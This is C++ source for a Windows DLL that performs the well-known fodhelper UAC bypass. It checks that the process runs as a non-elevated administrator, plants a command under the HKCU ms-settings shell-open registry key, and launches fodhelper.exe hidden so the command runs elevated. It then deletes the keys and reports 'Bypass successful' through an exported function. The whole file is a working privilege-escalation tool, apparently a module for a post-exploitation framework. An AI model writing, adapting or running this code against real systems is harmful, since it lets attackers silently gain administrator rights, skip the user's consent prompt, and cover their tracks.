#define no_init_all
#include <Windows.h>
#include <string>
#include <chrono>
#include <thread>
#include <strsafe.h>
#include <stdio.h>



//BOOL start(LPCWSTR cmd);


BOOL IsUserInAdminGroup()
{
	BOOL fInAdminGroup = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	HANDLE hToken = NULL;
	HANDLE hTokenToCheck = NULL;
	DWORD cbSize = 0;

	// Open the primary access token of the process for query and duplicate.
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE,
		&hToken))
	{
		dwError = GetLastError();
		//goto Cleanup;
	}

	// Running Windows Vista or later (major version >= 6). 
	// Determine token type: limited, elevated, or default. 
	TOKEN_ELEVATION_TYPE elevType;
	if (!GetTokenInformation(hToken, TokenElevationType, &elevType,
		sizeof(elevType), &cbSize))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	// If limited, get the linked elevated token for further check.
	if (TokenElevationTypeLimited == elevType)
	{
		if (!GetTokenInformation(hToken, TokenLinkedToken, &hTokenToCheck,
			sizeof(hTokenToCheck), &cbSize))
		{
			dwError = GetLastError();
			goto Cleanup;
		}
	}
	

	// CheckTokenMembership requires an impersonation token. If we just got a 
	// linked token, it already is an impersonation token.  If we did not get 
	// a linked token, duplicate the original into an impersonation token for 
	// CheckTokenMembership.
	if (!hTokenToCheck)
	{
		if (!DuplicateToken(hToken, SecurityIdentification, &hTokenToCheck))
		{
			dwError = GetLastError();
			goto Cleanup;
		}
	}

	// Create the SID corresponding to the Administrators group.
	BYTE adminSID[SECURITY_MAX_SID_SIZE];
	cbSize = sizeof(adminSID);
	if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &adminSID,
		&cbSize))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	// Check if the token to be checked contains admin SID.
	// http://msdn.microsoft.com/en-us/library/aa379596(VS.85).aspx:
	// To determine whether a SID is enabled in a token, that is, whether it 
	// has the SE_GROUP_ENABLED attribute, call CheckTokenMembership.
	if (!CheckTokenMembership(hTokenToCheck, &adminSID, &fInAdminGroup))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

Cleanup:
	// Centralized cleanup for all allocated resources.
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}
	if (hTokenToCheck)
	{
		CloseHandle(hTokenToCheck);
		hTokenToCheck = NULL;
	}

	// Throw the error if something failed in the function.
	if (ERROR_SUCCESS != dwError)
	{
		throw dwError;
	}

	return fInAdminGroup;
}


//
//   FUNCTION: IsProcessElevated()
//
//   PURPOSE: The function gets the elevation information of the current 
//   process. It dictates whether the process is elevated or not. Token 
//   elevation is only available on Windows Vista and newer operating 
//   systems, thus IsProcessElevated throws a C++ exception if it is called 
//   on systems prior to Windows Vista. It is not appropriate to use this 
//   function to determine whether a process is run as administartor.
//
//   RETURN VALUE: Returns TRUE if the process is elevated. Returns FALSE if 
//   it is not.
//
//   EXCEPTION: If this function fails, it throws a C++ DWORD exception 
//   which contains the Win32 error code of the failure. For example, if 
//   IsProcessElevated is called on systems prior to Windows Vista, the error 
//   code will be ERROR_INVALID_PARAMETER.
//
//   NOTE: TOKEN_INFORMATION_CLASS provides TokenElevationType to check the 
//   elevation type (TokenElevationTypeDefault / TokenElevationTypeLimited /
//   TokenElevationTypeFull) of the process. It is different from 
//   TokenElevation in that, when UAC is turned off, elevation type always 
//   returns TokenElevationTypeDefault even though the process is elevated 
//   (Integrity Level == High). In other words, it is not safe to say if the 
//   process is elevated based on elevation type. Instead, we should use 
//   TokenElevation.
//
//   EXAMPLE CALL:
//     try 
//     {
//         if (IsProcessElevated())
//             wprintf (L"Process is elevated\n");
//         else
//             wprintf (L"Process is not elevated\n");
//     }
//     catch (DWORD dwError)
//     {
//         wprintf(L"IsProcessElevated failed w/err %lu\n", dwError);
//     }
//
BOOL IsProcessElevated()
{
	BOOL fIsElevated = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	HANDLE hToken = NULL;

	// Open the primary access token of the process with TOKEN_QUERY.
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	// Retrieve token elevation information.
	TOKEN_ELEVATION elevation;
	DWORD dwSize;
	if (!GetTokenInformation(hToken, TokenElevation, &elevation,
		sizeof(elevation), &dwSize))
	{
		// When the process is run on operating systems prior to Windows 
		// Vista, GetTokenInformation returns FALSE with the 
		// ERROR_INVALID_PARAMETER error code because TokenElevation is 
		// not supported on those operating systems.
		dwError = GetLastError();
		goto Cleanup;
	}

	fIsElevated = elevation.TokenIsElevated;

Cleanup:
	// Centralized cleanup for all allocated resources.
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}

	// Throw the error if something failed in the function.
	if (ERROR_SUCCESS != dwError)
	{
		throw dwError;
	}

	return fIsElevated;
}


//
//   FUNCTION: GetProcessIntegrityLevel()
//
//   PURPOSE: The function gets the integrity level of the current process. 
//   Integrity level is only available on Windows Vista and newer operating 
//   systems, thus GetProcessIntegrityLevel throws a C++ exception if it is 
//   called on systems prior to Windows Vista.
//
//   RETURN VALUE: Returns the integrity level of the current process. It is 
//   usually one of these values:
//
//     SECURITY_MANDATORY_UNTRUSTED_RID (SID: S-1-16-0x0)
//     Means untrusted level. It is used by processes started by the 
//     Anonymous group. Blocks most write access. 
//
//     SECURITY_MANDATORY_LOW_RID (SID: S-1-16-0x1000)
//     Means low integrity level. It is used by Protected Mode Internet 
//     Explorer. Blocks write acess to most objects (such as files and 
//     registry keys) on the system. 
//
//     SECURITY_MANDATORY_MEDIUM_RID (SID: S-1-16-0x2000)
//     Means medium integrity level. It is used by normal applications 
//     being launched while UAC is enabled. 
//
//     SECURITY_MANDATORY_HIGH_RID (SID: S-1-16-0x3000)
//     Means high integrity level. It is used by administrative applications 
//     launched through elevation when UAC is enabled, or normal 
//     applications if UAC is disabled and the user is an administrator. 
//
//     SECURITY_MANDATORY_SYSTEM_RID (SID: S-1-16-0x4000)
//     Means system integrity level. It is used by services and other 
//     system-level applications (such as Wininit, Winlogon, Smss, etc.)  
//
//   EXCEPTION: If this function fails, it throws a C++ DWORD exception 
//   which contains the Win32 error code of the failure. For example, if 
//   GetProcessIntegrityLevel is called on systems prior to Windows Vista, 
//   the error code will be ERROR_INVALID_PARAMETER.
//
//   EXAMPLE CALL:
//     try 
//     {
//         DWORD dwIntegrityLevel = GetProcessIntegrityLevel();
//     }
//     catch (DWORD dwError)
//     {
//         wprintf(L"GetProcessIntegrityLevel failed w/err %lu\n", dwError);
//     }
//
DWORD GetProcessIntegrityLevel()
{
	DWORD dwIntegrityLevel = 0;
	DWORD dwError = ERROR_SUCCESS;
	HANDLE hToken = NULL;
	DWORD cbTokenIL = 0;
	PTOKEN_MANDATORY_LABEL pTokenIL = NULL;

	// Open the primary access token of the process with TOKEN_QUERY.
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	// Query the size of the token integrity level information. Note that 
	// we expect a FALSE result and the last error ERROR_INSUFFICIENT_BUFFER
	// from GetTokenInformation because we have given it a NULL buffer. On 
	// exit cbTokenIL will tell the size of the integrity level information.
	if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL))
	{
		if (ERROR_INSUFFICIENT_BUFFER != GetLastError())
		{
			// When the process is run on operating systems prior to Windows 
			// Vista, GetTokenInformation returns FALSE with the 
			// ERROR_INVALID_PARAMETER error code because TokenElevation 
			// is not supported on those operating systems.
			dwError = GetLastError();
			goto Cleanup;
		}
	}

	// Now we allocate a buffer for the integrity level information.
	pTokenIL = (TOKEN_MANDATORY_LABEL *)LocalAlloc(LPTR, cbTokenIL);
	if (pTokenIL == NULL)
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	// Retrieve token integrity level information.
	if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL,
		cbTokenIL, &cbTokenIL))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	// Integrity Level SIDs are in the form of S-1-16-0xXXXX. (e.g. 
	// S-1-16-0x1000 stands for low integrity level SID). There is one and 
	// only one subauthority.
	dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

Cleanup:
	// Centralized cleanup for all allocated resources.
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}
	if (pTokenIL)
	{
		LocalFree(pTokenIL);
		pTokenIL = NULL;
		cbTokenIL = 0;
	}

	// Throw the error if something failed in the function.
	if (ERROR_SUCCESS != dwError)
	{
		throw dwError;
	}

	return dwIntegrityLevel;
}

std::wstring GetCurrentExePath()
{
	WCHAR buffer[MAX_PATH];
	GetModuleFileNameW(NULL, buffer, sizeof(buffer));
	std::wstring str(buffer);
	return str;
}




static wchar_t * utf8_to_wchar(const char *in)
{
	wchar_t *out;
	int len;

	if (in == NULL) {
		return NULL;
	}

	len = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, in, -1, NULL, 0);
	if (len <= 0) {
		return NULL;
	}

	out = (wchar_t *)calloc(len, sizeof(wchar_t));
	if (out == NULL) {
		return NULL;
	}

	if (MultiByteToWideChar(CP_UTF8, 0, in, -1, out, len) == 0) {
		free(out);
		out = NULL;
	}

	return out;
}

BOOL start(LPCWSTR cmd, std::wstring* result)
{
	BOOL ret = FALSE;
	auto thisExePath = GetCurrentExePath();
	//wprintf((L"Filepath: " + thisExePath + L"\n").c_str());

	if (IsProcessElevated())
	{
		//wprintf(L"Process is elevated. Exiting...\n");
		return ret;
	}

	if (!IsUserInAdminGroup())
	{
		//wprintf(L"User is not in local administrators. Exiting...\n");
		return ret;
	}

	
	if (GetProcessIntegrityLevel() == SECURITY_MANDATORY_MEDIUM_RID)
	{
		//wprintf(L"Running in Medium Integrity...\n");
	}
	if (GetProcessIntegrityLevel() == SECURITY_MANDATORY_HIGH_RID)
	{
		//wprintf(L"Running in High Integrity...\n");
		return ret;
	}
	

	//-------------------------------------------------------------------------------------------------------
	// TODO make the registry keys needed for the UAC Bypass
	//-------------------------------------------------------------------------------------------------------
	// ref: https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
	// create the reg keys
	HKEY key;

	//create the reg keys
	auto result2 = RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings", &key);
	//printf(result2 != ERROR_SUCCESS ? "failed to open or create reg key\n" : "successfully create reg key\n");


	auto result1 = RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command", &key);
	//printf(result1 != ERROR_SUCCESS ? "failed to open or create reg key\n" : "successfully create reg key\n");

	//set values
	DWORD dataType = REG_SZ;
	std::wstring name = L"DelegateExecute";
	std::wstring value = L"";
	DWORD size = (DWORD)(value.size() * sizeof(wchar_t));
	RegSetKeyValueW(key, NULL, name.c_str(), dataType, value.c_str(), size);
	

	name = L"";
	//value = cmd;
	//CMD_TO_RUN;
	value = cmd;
	size = (DWORD)(value.size() * sizeof(wchar_t));
	RegSetKeyValueW(key, NULL, name.c_str(), dataType, value.c_str(), size);

	_SHELLEXECUTEINFOW se = {};
	se.cbSize = sizeof(_SHELLEXECUTEINFOW);
	//if EXE is 64 bit, call 64 bit in system32
	//if EXE is 32 bit on 32 bit Windows, also call system32
	se.lpDirectory = L"C:\\WINDOWS\\System32";
	se.lpFile = L"C:\\WINDOWS\\System32\\fodhelper.exe";
	
#if defined(_WIN32)
	BOOL f64 = FALSE;
	if (IsWow64Process(GetCurrentProcess(), &f64) && f64)
	{
		//this EXE is 32 bit on 64 bit Windows, call SysWOW64
		se.lpDirectory = L"C:\\WINDOWS\\SysWOW64";
		se.lpFile = L"C:\\WINDOWS\\SysWOW64\\fodhelper.exe";
	}
#endif
	se.lpParameters = L"";
	se.nShow = SW_HIDE;
	se.hwnd = NULL;
	se.lpDirectory = NULL;
	ShellExecuteExW(&se);

	//sleep to allow process to spawn
	std::this_thread::sleep_for(std::chrono::seconds(3));

	//cleanup registry
	RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open", 0, KEY_ALL_ACCESS, &key);
	RegDeleteKeyExW(key, L"command", KEY_WOW64_64KEY, 0);
	RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell", 0, KEY_ALL_ACCESS, &key);
	RegDeleteKeyExW(key, L"Open", KEY_WOW64_64KEY, 0);
	RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings", 0, KEY_ALL_ACCESS, &key);
	RegDeleteKeyExW(key, L"Shell", KEY_WOW64_64KEY, 0);

	*result = L"Bypass successful";
	ret = TRUE;
	return ret;
}

extern "C" __declspec(dllexport) LPWSTR ExecuteW(LPCWSTR lpUserdata, DWORD nUserdataLen)
{
	UNREFERENCED_PARAMETER(lpUserdata);
	UNREFERENCED_PARAMETER(nUserdataLen);

	LPWSTR result = NULL;
	HRESULT hr = E_FAIL;
	HANDLE hProcess = GetCurrentProcess();
	HANDLE hToken = NULL;

	OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
	if (hToken == NULL)
	{
		return NULL;
	}

	std::wstring wResult = L"";
	if (start(lpUserdata, &wResult))
	{
		if (wResult.size() > 0)
		{
			DWORD dwOutLen = (DWORD)wResult.length();
			DWORD dwResultLen = dwOutLen + 1;

			result = (LPWSTR)LocalAlloc(LPTR, dwResultLen * sizeof(WCHAR));
			if (result != NULL)
			{
				hr = StringCchCopyNW(result, dwResultLen, (LPWSTR)wResult.c_str(), dwOutLen);
			}
		}
	}

		return result;
}


#ifndef _DEBUG
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_THREAD_ATTACH:
	case DLL_PROCESS_ATTACH:
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
#endif

#if _DEBUG
int main()
{
	std::wstring out = L"";
	std::wstring input = L"cmd /c dir";
	LPWSTR lpsz = ExecuteW((LPWSTR)input.c_str(), (DWORD)input.length());
	if (lpsz)
	{	
		out = lpsz;
		LocalFree(lpsz);
		lpsz = NULL;

		if (out.size() > 0)
		{
			DWORD dwOutLen = (DWORD)out.length();
			DWORD dwResultLen = dwOutLen + 1;
			LPWSTR result = NULL;
			result = (LPWSTR)LocalAlloc(LPTR, dwResultLen * sizeof(WCHAR));
			if (result == NULL)
			{
				return -1;
			}
			HRESULT hr = StringCchCopyNW(result, dwResultLen, (LPWSTR)out.c_str(), dwOutLen);
			if (SUCCEEDED(hr))
			{
				//wprintf(L"%s\n", result);
			}

			LocalFree(result);
		}
	}
	return 0;
}
#endif

